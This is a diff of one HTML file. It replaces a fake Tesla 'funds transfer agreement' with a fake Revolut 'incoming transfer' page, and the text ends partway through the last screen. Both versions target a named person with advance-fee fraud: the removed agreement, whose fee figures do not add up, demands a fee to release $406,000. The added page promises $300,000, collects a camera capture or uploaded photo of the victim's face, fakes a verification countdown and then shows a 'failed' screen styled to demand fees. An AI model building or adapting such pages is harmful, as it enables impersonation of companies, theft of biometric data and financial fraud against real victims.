@@ -2,439 +2,709 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Tesla Funds</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Revolut — Incoming Transfer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      font-family: "Times New Roman", Times, serif;
-      background: #f4f4f4;
-      color: #111;
-      padding: 40px 20px;
-    }
-
-    .page {
-      max-width: 860px;
-      margin: 0 auto;
-      background: #fff;
-      padding: 70px 80px;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.12);
-      border-top: 6px solid #cc0000;
-    }
-
-    .header {
-      text-align: center;
-      margin-bottom: 40px;
-      border-bottom: 2px solid #cc0000;
-      padding-bottom: 24px;
-    }
-
-    .tesla-logo {
-      font-size: 44px;
-      font-weight: 900;
-      letter-spacing: 10px;
-      color: #cc0000;
-      font-family: Arial, sans-serif;
-      text-transform: uppercase;
-    }
-
-    .header-sub {
-      font-size: 13px;
-      color: #555;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      margin-top: 6px;
-    }
-
-    .doc-title {
-      font-size: 20px;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      text-align: center;
-      margin: 32px 0 8px;
-      color: #1a1a1a;
-    }
-
-    .doc-ref {
-      text-align: center;
-      font-size: 12px;
-      color: #666;
-      margin-bottom: 36px;
-      letter-spacing: 1px;
-    }
-
-    .section-title {
-      font-size: 13px;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 1.5px;
-      color: #cc0000;
-      border-bottom: 1px solid #e0e0e0;
-      padding-bottom: 5px;
-      margin: 32px 0 14px;
-    }
-
-    p {
-      font-size: 13.5px;
-      line-height: 1.85;
-      color: #222;
-      margin-bottom: 10px;
-    }
-
-    .parties-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-bottom: 10px;
-      font-size: 13.5px;
-    }
-
-    .parties-table td {
-      padding: 7px 12px;
-      vertical-align: top;
-    }
-
-    .parties-table td:first-child {
-      width: 200px;
-      font-weight: bold;
-      color: #444;
-    }
-
-    .financial-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 16px 0 24px;
-      font-size: 13.5px;
-    }
-
-    .financial-table th {
-      background: #1a1a1a;
-      color: #fff;
-      padding: 10px 14px;
-      text-align: left;
-      font-size: 12px;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-    }
-
-    .financial-table td {
-      padding: 10px 14px;
-      border-bottom: 1px solid #e8e8e8;
-    }
-
-    .financial-table tr:nth-child(even) td {
-      background: #f9f9f9;
-    }
-
-    .financial-table tr.total-row td {
-      background: #cc0000;
-      color: #fff;
-      font-weight: bold;
-      border-bottom: none;
-    }
-
-    .financial-table tr.subtotal-row td {
+      font-family: 'Inter', sans-serif;
       background: #f0f0f0;
-      font-weight: bold;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
     }
 
-    .amount {
-      text-align: right;
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: #fff;
+      border-radius: 28px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.13);
+      overflow: hidden;
     }
 
-    .status-badge {
-      display: inline-block;
-      padding: 2px 10px;
-      border-radius: 3px;
-      font-size: 11px;
-      font-weight: bold;
-      letter-spacing: 1px;
-      text-transform: uppercase;
+    /* ── HEADER ── */
+    .card-header {
+      background: #0a0a0a;
+      padding: 32px 24px 24px;
+    }
+    .brand-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+    .brand-icon {
+      width: 40px; height: 40px;
+      background: #fff;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .brand-icon svg { width: 22px; height: 22px; }
+    .brand-name { font-size: 17px; font-weight: 700; color: #fff; }
+    .brand-sub  { font-size: 11px; color: #888; margin-top: 1px; }
+    .secure-badge {
+      margin-left: auto;
+      background: #00D4AA;
+      color: #000;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 3px 10px;
+      border-radius: 999px;
+      letter-spacing: .04em;
     }
 
-    .badge-paid {
-      background: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
+    .amount-block { text-align: center; margin-bottom: 4px; }
+    .amount-icon {
+      width: 62px; height: 62px;
+      background: rgba(0,212,170,.15);
+      border-radius: 50%;
+      display: inline-flex; align-items: center; justify-content: center;
+      margin-bottom: 12px;
     }
-
-    .badge-pending {
-      background: #fff3cd;
-      color: #856404;
-      border: 1px solid #ffc107;
-    }
-
-    .badge-outstanding {
-      background: #f8d7da;
-      color: #721c24;
-      border: 1px solid #f5c6cb;
-    }
-
-    .highlight-box {
-      background: #fef9f0;
-      border-left: 4px solid #cc0000;
-      padding: 14px 18px;
-      margin: 20px 0;
-      font-size: 13px;
-      color: #333;
-    }
-
-    .highlight-box strong {
-      color: #cc0000;
-    }
-
-    .signature-block {
-      margin-top: 50px;
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 40px;
-    }
-
-    .sig-section {
-      border-top: 1px solid #333;
-      padding-top: 10px;
-      font-size: 12.5px;
-      color: #444;
-    }
-
-    .sig-section .name {
-      font-weight: bold;
-      font-size: 13px;
-      color: #111;
-      margin-bottom: 3px;
-    }
-
-    .sig-space {
-      height: 44px;
-    }
-
-    .footer {
-      margin-top: 48px;
-      border-top: 2px solid #cc0000;
-      padding-top: 16px;
+    .amount-icon svg { width: 30px; height: 30px; color: #00D4AA; }
+    .amount-label {
       font-size: 11px;
       color: #888;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      font-weight: 600;
+    }
+    .amount-value {
+      font-size: 40px;
+      font-weight: 800;
+      color: #fff;
+      margin: 4px 0 2px;
+      letter-spacing: -.5px;
+    }
+    .amount-sub { font-size: 13px; color: #00D4AA; font-weight: 600; }
+
+    /* ── BODY ── */
+    .card-body { padding: 20px 24px; }
+    .section-label {
+      font-size: 10px;
+      color: #aaa;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+    .detail-list { display: flex; flex-direction: column; gap: 0; }
+    .detail-row {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 13px 0;
+      border-bottom: 1px solid #f2f2f2;
+    }
+    .detail-row:last-child { border-bottom: none; }
+    .d-label { font-size: 11px; color: #aaa; white-space: nowrap; }
+    .d-value { font-size: 13px; color: #333; text-align: right; }
+    .d-value.bold { font-weight: 700; color: #111; }
+    .d-value.mono { font-family: 'Menlo', monospace; letter-spacing: .03em; }
+    .d-value.badge {
+      background: #fef3c7;
+      color: #b45309;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 999px;
+    }
+    .address-block { padding: 13px 0; border-bottom: 1px solid #f2f2f2; }
+    .address-block .d-label { font-size: 11px; color: #aaa; margin-bottom: 4px; }
+    .address-name { font-size: 13px; font-weight: 700; color: #111; }
+    .address-line { font-size: 11px; color: #777; margin-top: 2px; }
+
+    /* ── FOOTER ── */
+    .card-footer { padding: 8px 24px 32px; background: #fff; }
+    .btn-primary {
+      width: 100%;
+      background: #0a0a0a;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      padding: 16px;
+      border: none;
+      border-radius: 18px;
+      cursor: pointer;
+      transition: background .15s, transform .1s;
+      box-shadow: 0 6px 20px rgba(0,0,0,.18);
+    }
+    .btn-primary:hover  { background: #222; }
+    .btn-primary:active { transform: scale(.97); }
+    .btn-secondary {
+      width: 100%;
+      background: #f3f4f6;
+      color: #444;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 14px;
+      border: none;
+      border-radius: 18px;
+      cursor: pointer;
+      transition: background .15s;
+      margin-top: 10px;
+    }
+    .btn-secondary:hover { background: #e5e7eb; }
+    .btn-hint {
       text-align: center;
-      line-height: 1.6;
+      font-size: 11px;
+      color: #bbb;
+      margin-top: 10px;
     }
 
-    .watermark-notice {
-      background: #fff8e1;
-      border: 1px solid #ffe082;
-      border-radius: 4px;
-      padding: 10px 16px;
-      font-size: 12px;
-      color: #5d4037;
+    /* ── VERIFY ── */
+    .info-box {
+      border-radius: 18px;
+      padding: 14px 16px;
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .info-box.blue  { background: #eff6ff; border: 1px solid #dbeafe; }
+    .info-box.red   { background: #fef2f2; border: 1px solid #fee2e2; }
+    .info-box.amber { background: #fffbeb; border: 1px solid #fde68a; }
+    .info-box svg { width: 18px; height: 18px; flex-shrink: 0; margin-top: 1px; }
+    .info-box.blue  svg { color: #3b82f6; }
+    .info-box.red   svg { color: #ef4444; }
+    .info-box.amber svg { color: #d97706; }
+    .info-box-title { font-size: 13px; font-weight: 700; margin-bottom: 3px; }
+    .info-box.blue  .info-box-title { color: #1e40af; }
+    .info-box.red   .info-box-title { color: #991b1b; }
+    .info-box.amber .info-box-title { color: #92400e; }
+    .info-box-body { font-size: 11px; }
+    .info-box.blue  .info-box-body { color: #2563eb; }
+    .info-box.red   .info-box-body { color: #dc2626; }
+    .info-box.amber .info-box-body { color: #b45309; }
+
+    .face-box {
+      border: 2px dashed #e5e7eb;
+      border-radius: 18px;
+      overflow: hidden;
+      min-height: 200px;
+      background: #f9fafb;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .face-placeholder {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      padding: 24px;
       text-align: center;
-      margin-bottom: 30px;
-      letter-spacing: 0.5px;
+    }
+    .face-placeholder-icon {
+      width: 64px; height: 64px;
+      background: #e5e7eb;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .face-placeholder-icon svg { width: 32px; height: 32px; color: #9ca3af; }
+    .face-placeholder p { font-size: 13px; color: #6b7280; font-weight: 600; }
+    .face-placeholder small { font-size: 11px; color: #9ca3af; }
+    #video-preview, #img-preview { width: 100%; height: 200px; object-fit: cover; display: none; }
+
+    .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
+    .btn-gray {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: #f3f4f6;
+      color: #1f2937;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 13px;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .btn-gray:hover { background: #e5e7eb; }
+    .btn-gray svg { width: 16px; height: 16px; }
+
+    /* ── PROCESSING ── */
+    .circle-wrap {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 80px; height: 80px;
+      margin-bottom: 16px;
+    }
+    .circle-wrap svg { position: absolute; inset: 0; transform: rotate(-90deg); }
+    .circle-wrap span { font-size: 22px; font-weight: 800; color: #fff; position: relative; z-index: 1; }
+    .step-list { display: flex; flex-direction: column; gap: 14px; }
+    .step-item { display: flex; align-items: center; gap: 12px; }
+    .step-dot {
+      width: 20px; height: 20px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      transition: background .3s;
+    }
+    .step-dot.done { background: #00D4AA; }
+    .step-dot.pending { background: #e5e7eb; }
+    .step-dot svg { width: 11px; height: 11px; }
+    .step-dot .dot-inner { width: 8px; height: 8px; background: #9ca3af; border-radius: 50%; }
+    .step-label { font-size: 13px; transition: color .3s; }
+    .step-label.done { color: #111; font-weight: 600; }
+    .step-label.pending { color: #9ca3af; }
+    .encrypt-note {
+      margin-top: 28px;
+      background: #f9fafb;
+      border-radius: 16px;
+      padding: 14px;
+      font-size: 11px;
+      color: #aaa;
+      text-align: center;
     }
 
-    @media print {
-      body { background: #fff; padding: 0; }
-      .page { box-shadow: none; padding: 40px 60px; border-top: 4px solid #cc0000; }
-      .watermark-notice { display: none; }
+    /* ── ERROR ── */
+    .dark-box {
+      background: #0a0a0a;
+      border-radius: 18px;
+      padding: 20px;
+      margin-bottom: 16px;
     }
+    .dark-box-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .dark-box-label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: .08em; }
+    .urgent-badge {
+      background: #ef4444;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 3px 10px;
+      border-radius: 999px;
+    }
+    .fee-amount { font-size: 34px; font-weight: 800; color: #fff; margin-bottom: 2px; }
+    .fee-sub { font-size: 11px; color: #555; }
+    .fee-breakdown {
+      border-top: 1px solid rgba(255,255,255,.08);
+      margin-top: 14px;
+      padding-top: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .fee-row { display: flex; justify-content: space-between; font-size: 11px; }
+    .fee-row span:first-child { color: #666; }
+    .fee-row span:last-child  { color: #fff; font-weight: 600; }
+    .fee-row.total { border-top: 1px solid rgba(255,255,255,.08); padding-top: 8px; }
+    .fee-row.total span:last-child { color: #00D4AA; font-weight: 800; }
+    .fee-row.danger span:last-child { color: #ef4444; }
+
+    .next-steps { margin-bottom: 20px; }
+    .next-steps-label {
+      font-size: 10px;
+      color: #aaa;
+      text-transform: uppercase;
+      letter-spacing: .1em;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .next-step-item { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
+    .step-num {
+      width: 20px; height: 20px;
+      background: #0a0a0a;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 800;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .next-step-item p { font-size: 13px; color: #374151; }
+
+    .case-id { text-align: center; font-size: 11px; color: #bbb; margin-top: 12px; }
+
+    /* Screens */
+    .screen { display: none; }
+    .screen.active { display: block; }
   </style>
 </head>
 <body>
-  <div class="page">
 
-    <div class="header">
-      <div class="tesla-logo">TESLA</div>
-      <div class="header-sub">Tesla, Inc. &nbsp;|&nbsp; Financial Services Division</div>
-    </div>
-
-    <div class="watermark-notice">
-      CONFIDENTIAL &mdash; This document is intended solely for the named party below. Unauthorized distribution is prohibited.
-    </div>
-
-    <div class="doc-title">Funds Transfer &amp; Payment Agreement</div>
-    <div class="doc-ref">
-      Reference No.: TSL-FA-2026-0318 &nbsp;&nbsp;|&nbsp;&nbsp; Date of Issue: March 18, 2026
-    </div>
-
-    <div class="section-title">I. Parties to this Agreement</div>
-
-    <table class="parties-table">
-      <tr>
-        <td>Issuing Party:</td>
-        <td>Tesla, Inc., a Delaware Corporation<br>1 Tesla Road, Austin, Texas 78725, USA</td>
-      </tr>
-      <tr>
-        <td>Receiving Party:</td>
-        <td><strong>Mr. Finnur Sturluson</strong></td>
-      </tr>
-      <tr>
-        <td>Agreement Type:</td>
-        <td>Funds Transfer Agreement &ndash; Payment Schedule</td>
-      </tr>
-      <tr>
-        <td>Effective Date:</td>
-        <td>March 18, 2026</td>
-      </tr>
-    </table>
-
-    <div class="section-title">II. Agreement Overview</div>
-
-    <p>
-      This Funds Transfer and Payment Agreement (&ldquo;Agreement&rdquo;) is entered into as of the date stated above between Tesla, Inc.
-      (&ldquo;the Company&rdquo;) and <strong>Mr. Finnur Sturluson</strong> (&ldquo;the Recipient&rdquo;). This Agreement governs the terms,
-      conditions, and schedule pertaining to the transfer of funds in the amount set forth herein.
-    </p>
-
-    <p>
-      The Company agrees to facilitate the disbursement of funds to the Recipient in accordance with the payment schedule and fee
-      structure detailed in this document. Both parties acknowledge and agree to the terms stated herein by their respective execution
-      of this Agreement.
-    </p>
-
-    <div class="section-title">III. Financial Summary</div>
-
-    <table class="financial-table">
-      <thead>
-        <tr>
-          <th>Description</th>
-          <th class="amount">Amount (USD)</th>
-          <th>Status</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>Total Funds to be Transferred</td>
-          <td class="amount">$406,000.00</td>
-          <td>&mdash;</td>
-        </tr>
-        <tr>
-          <td>Processing &amp; Administrative Fee</td>
-          <td class="amount">$1,100.00</td>
-          <td>&mdash;</td>
-        </tr>
-        <tr class="subtotal-row">
-          <td>Total Obligation (Funds + Fee)</td>
-          <td class="amount">$407,100.00</td>
-          <td>&mdash;</td>
-        </tr>
-        <tr>
-          <td>Total Fee Assessed</td>
-          <td class="amount">$1,100.00</td>
-          <td>&mdash;</td>
-        </tr>
-        <tr>
-          <td>&nbsp;&nbsp;&nbsp;Amount Paid (toward fee)</td>
-          <td class="amount">$100.00</td>
-          <td><span class="status-badge badge-paid">Received</span></td>
-        </tr>
-        <tr>
-          <td>&nbsp;&nbsp;&nbsp;Balance Remaining (fee)</td>
-          <td class="amount">$100.00</td>
-          <td><span class="status-badge badge-outstanding">Outstanding</span></td>
-        </tr>
-        <tr class="total-row">
-          <td>Principal Funds Held &ndash; Pending Clearance</td>
-          <td class="amount">$406,000.00</td>
-          <td><span class="status-badge badge-pending" style="background:#fff3cd;color:#856404;border:1px solid #ffc107;">Pending</span></td>
-        </tr>
-      </tbody>
-    </table>
-
-    <div class="highlight-box">
-      <strong>Important Notice:</strong> The principal amount of <strong>$406,000.00</strong> will be released and transferred to
-      <strong>Mr. Finnur Sturluson</strong> upon full settlement of the outstanding processing fee balance of <strong>$100.00</strong>.
-      A partial fee payment of <strong>$100.00</strong> has been received and applied. The remaining balance of <strong>$100.00</strong>
-      must be remitted to complete the fee obligation and initiate the fund disbursement.
-    </div>
-
-    <div class="section-title">IV. Fee Structure &amp; Payment Schedule</div>
-
-    <p>
-      The total processing and administrative fee for this funds transfer transaction is <strong>$1,100.00</strong> (One Thousand One Hundred
-      United States Dollars). This fee covers all administrative, compliance, and processing costs associated with the transfer of
-      <strong>$406,000.00</strong> to the Recipient.
-    </p>
-
-    <table class="financial-table">
-      <thead>
-        <tr>
-          <th>Fee Component</th>
-          <th class="amount">Amount</th>
-          <th>Status</th>
-          <th>Date</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>Total Fee Assessed</td>
-          <td class="amount">$1,100.00</td>
-          <td>&mdash;</td>
-          <td>&mdash;</td>
-        </tr>
-        <tr>
-          <td>Payment Received &ndash; Installment 1</td>
-          <td class="amount">$100.00</td>
-          <td><span class="status-badge badge-paid">Paid</span></td>
-          <td>March 18, 2026</td>
-        </tr>
-        <tr>
-          <td>Remaining Fee Balance</td>
-          <td class="amount">$100.00</td>
-          <td><span class="status-badge badge-outstanding">Outstanding</span></td>
-          <td>Due Upon Receipt</td>
-        </tr>
-        <tr class="subtotal-row">
-          <td>Fee Balance After Payments</td>
-          <td class="amount">$900.00</td>
-          <td><span class="status-badge badge-pending">Deferred</span></td>
-          <td>Per Agreement</td>
-        </tr>
-      </tbody>
-    </table>
-
-    <p>
-      Note: Of the total fee of $1,100.00, a prior arrangement has deferred $900.00 in accordance with the terms negotiated between
-      the parties. The only amount currently due and payable to release the principal funds is the outstanding balance of <strong>$100.00</strong>.
-    </p>
-
-    <div class="section-title">V. Terms &amp; Conditions</div>
-
-    <p><strong>5.1 Fund Release Condition.</strong> The disbursement of the principal amount of $406,000.00 is contingent upon full payment of all outstanding fees. The Recipient acknowledges that the fund transfer process will not be initiated until the outstanding fee balance of $100.00 has been received and confirmed.</p>
-
-    <p><strong>5.2 Confidentiality.</strong> Both parties agree to maintain strict confidentiality with respect to the terms of this Agreement and all communications related hereto. This Agreement shall not be disclosed to any third party without the express written consent of both parties.</p>
-
-    <p><strong>5.3 Governing Law.</strong> This Agreement shall be governed by and construed in accordance with the laws of the State of Delaware, United States of America, without regard to its conflict of law provisions.</p>
-
-    <p><strong>5.4 Amendments.</strong> No amendment, modification, or waiver of any provision of this Agreement shall be valid unless it is in writing and duly executed by both parties.</p>
-
-    <p><strong>5.5 Entire Agreement.</strong> This Agreement constitutes the entire understanding between the parties with respect to the subject matter hereof and supersedes all prior negotiations, representations, warranties, and understandings of the parties.</p>
-
-    <div class="section-title">VI. Authorized Signatures</div>
-
-    <p>By signing below, both parties agree to the terms and conditions set forth in this Agreement.</p>
-
-    <div class="signature-block">
-      <div class="sig-section">
-        <div class="sig-space"></div>
-        <div class="name">Mr. Finnur Sturluson</div>
-        <div>Recipient</div>
-        <div style="margin-top:6px;">Date: ____________________</div>
+<!-- ═══════════ SCREEN 1: NOTIFICATION ═══════════ -->
+<div id="screen-notification" class="screen active">
+  <div class="card">
+    <div class="card-header">
+      <div class="brand-row">
+        <div class="brand-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#0a0a0a" stroke-width="2.2" stroke-linecap="round">
+            <path d="M4 6h16M4 10h16M4 14h8"/>
+          </svg>
+        </div>
+        <div>
+          <div class="brand-name">Revolut</div>
+          <div class="brand-sub">Revolut Bank UAB</div>
+        </div>
+        <div class="secure-badge">SECURE</div>
       </div>
-      <div class="sig-section">
-        <div class="sig-space"></div>
-        <div class="name">Authorized Representative</div>
-        <div>Tesla, Inc. &ndash; Financial Services Division</div>
-        <div style="margin-top:6px;">Date: ____________________</div>
+
+      <div class="amount-block">
+        <div class="amount-icon">
+          <svg fill="none" viewBox="0 0 24 24" stroke="#00D4AA" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+        </div>
+        <div class="amount-label">Incoming Transfer</div>
+        <div class="amount-value">$300,000.00</div>
+        <div class="amount-sub">USD Transfer Received</div>
       </div>
     </div>
 
-    <div class="footer">
-      Tesla, Inc. &nbsp;|&nbsp; 1 Tesla Road, Austin, TX 78725 &nbsp;|&nbsp; financial.services
-      <br/>
-      Reference: TSL-FA-2026-0318 &nbsp;|&nbsp; This document is legally binding upon execution by both parties.
-      <br/>
-      &copy; 2026 Tesla, Inc. All rights reserved.
+    <div class="card-body">
+      <div class="section-label">Transfer Details</div>
+      <div class="detail-list">
+        <div class="detail-row">
+          <span class="d-label">Beneficiary</span>
+          <span class="d-value bold">Finnur Sturluson</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-label">IBAN</span>
+          <span class="d-value mono">LT85 3250 0361 9247 4803</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-label">BIC / SWIFT</span>
+          <span class="d-value mono">REVOLT21</span>
+        </div>
+        <div class="address-block">
+          <div class="d-label">Bank Name &amp; Address</div>
+          <div class="address-name">Revolut Bank UAB</div>
+          <div class="address-line">Konstitucijos ave. 21B, 08130, Vilnius, Lithuania</div>
+        </div>
+        <div class="detail-row">
+          <span class="d-label">Correspondent BIC</span>
+          <span class="d-value mono">CHASDEFX</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-label">Status</span>
+          <span class="d-value badge">Pending Acceptance</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-label">Reference</span>
+          <span class="d-value">Wire Transfer — Professional Funds</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-label">Date</span>
+          <span class="d-value">24 March 2026</span>
+        </div>
+      </div>
     </div>
 
+    <div class="card-footer">
+      <button class="btn-primary" onclick="goTo('screen-verify')">Accept Now</button>
+      <div class="btn-hint">By accepting, you confirm receipt of this transfer</div>
+    </div>
   </div>
+</div>
+
+<!-- ═══════════ SCREEN 2: VERIFY ═══════════ -->
+<div id="screen-verify" class="screen">
+  <div class="card">
+    <div class="card-header" style="text-align:center; padding-top:36px; padding-bottom:24px;">
+      <div class="amount-icon" style="background:rgba(0,212,170,.15); margin-bottom:12px;">
+        <svg fill="none" viewBox="0 0 24 24" stroke="#00D4AA" stroke-width="2" style="width:26px;height:26px;">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/>
+        </svg>
+      </div>
+      <div class="brand-name" style="font-size:20px;">Identity Verification</div>
+      <div class="brand-sub" style="font-size:13px; margin-top:4px;">Required to release your funds</div>
+    </div>
+
+    <div class="card-body">
+      <div class="info-box blue">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+        </svg>
+        <div>
+          <div class="info-box-title">Secure Verification Required</div>
+          <div class="info-box-body">To comply with anti-money laundering regulations and release your $300,000 transfer, we need to verify your identity.</div>
+        </div>
+      </div>
+
+      <div class="face-box" id="face-box">
+        <div class="face-placeholder" id="face-placeholder">
+          <div class="face-placeholder-icon">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
+            </svg>
+          </div>
+          <p>No face captured</p>
+          <small>Use camera or upload a clear photo of your face</small>
+        </div>
+        <video id="video-preview" autoplay playsinline muted></video>
+        <img id="img-preview" alt="Face preview" />
+      </div>
+
+      <div class="btn-row">
+        <button class="btn-gray" onclick="startCamera()">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/>
+            <path stroke-linecap="round" stroke-linejoin="round" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/>
+          </svg>
+          Use Camera
+        </button>
+        <button class="btn-gray" onclick="document.getElementById('file-input').click()">
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/>
+          </svg>
+          Upload Photo
+        </button>
+      </div>
+
+      <input type="file" id="file-input" accept="image/*" capture="user" style="display:none" onchange="handleUpload(event)" />
+
+      <button class="btn-primary" id="submit-btn" disabled style="opacity:.4;cursor:not-allowed;" onclick="startProcessing()">
+        Submit Verification
+      </button>
+      <div class="btn-hint">Your biometric data is encrypted and protected under GDPR</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════ SCREEN 3: PROCESSING ═══════════ -->
+<div id="screen-processing" class="screen">
+  <div class="card">
+    <div class="card-header" style="text-align:center; padding-top:40px; padding-bottom:32px;">
+      <div class="circle-wrap">
+        <svg viewBox="0 0 80 80" width="80" height="80">
+          <circle cx="40" cy="40" r="34" fill="none" stroke="#333" stroke-width="5"/>
+          <circle id="progress-circle" cx="40" cy="40" r="34" fill="none"
+            stroke="#00D4AA" stroke-width="5"
+            stroke-dasharray="213.6" stroke-dashoffset="213.6"
+            stroke-linecap="round"
+            style="transition: stroke-dashoffset 0.9s linear;"/>
+        </svg>
+        <span id="countdown-num">13</span>
+      </div>
+      <div class="brand-name" style="font-size:20px;">Verifying Identity</div>
+      <div class="brand-sub" style="font-size:13px; margin-top:4px;">Please wait while we process your verification</div>
+    </div>
+
+    <div class="card-body">
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-dot pending" id="dot-0">
+            <div class="dot-inner"></div>
+          </div>
+          <span class="step-label pending" id="lbl-0">Scanning biometric data</span>
+        </div>
+        <div class="step-item">
+          <div class="step-dot pending" id="dot-1">
+            <div class="dot-inner"></div>
+          </div>
+          <span class="step-label pending" id="lbl-1">Cross-referencing with ID records</span>
+        </div>
+        <div class="step-item">
+          <div class="step-dot pending" id="dot-2">
+            <div class="dot-inner"></div>
+          </div>
+          <span class="step-label pending" id="lbl-2">AML compliance check</span>
+        </div>
+        <div class="step-item">
+          <div class="step-dot pending" id="dot-3">
+            <div class="dot-inner"></div>
+          </div>
+          <span class="step-label pending" id="lbl-3">Finalizing authorization</span>
+        </div>
+      </div>
+      <div class="encrypt-note">
+        This process is fully encrypted and compliant with EU banking regulations
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════ SCREEN 4: ERROR ═══════════ -->
+<div id="screen-error" class="screen">
+  <div class="card">
+    <div class="card-header" style="text-align:center; padding-top:40px; padding-bottom:32px;">
+      <div class="amount-icon" style="background:rgba(239,68,68,.15); margin-bottom:14px;">
+        <svg fill="none" viewBox="0 0 24 24" stroke="#f87171" stroke-width="2" style="width:30px;height:30px;">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+        </svg>
+      </div>
+      <div class="brand-name" style="font-size:20px;">Verification Failed</div>
+      <div class="brand-sub" style="font-size:13px; margin-top:4px;">Action required to release your funds</div>
+    </div>
+
+    <div class="card-body">
+      <div class="info-box red">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+        </svg>
+        <div>
